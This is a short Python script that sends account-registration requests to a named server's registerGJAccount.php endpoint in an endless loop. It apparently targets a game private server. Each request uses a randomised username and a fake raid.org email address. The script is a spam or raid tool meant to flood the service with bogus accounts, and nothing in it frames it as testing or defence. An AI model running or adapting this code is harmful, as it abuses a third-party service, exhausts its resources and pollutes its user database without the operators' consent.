import requests
import random
endpoint = "http://aspirix.ru/sp/database/"

def createAcc(userName, password, email):
    rstr = str(random.randint(1111111, 9999999))
    data = {'userName':userName+rstr, 'password':password, 'email':email+rstr+"@raid.org"}
    r = requests.post(endpoint+"accounts/registerGJAccount.php", data=data)
    return r.text

while True:
    print(createAcc("dimple", "pass", "email"))
    
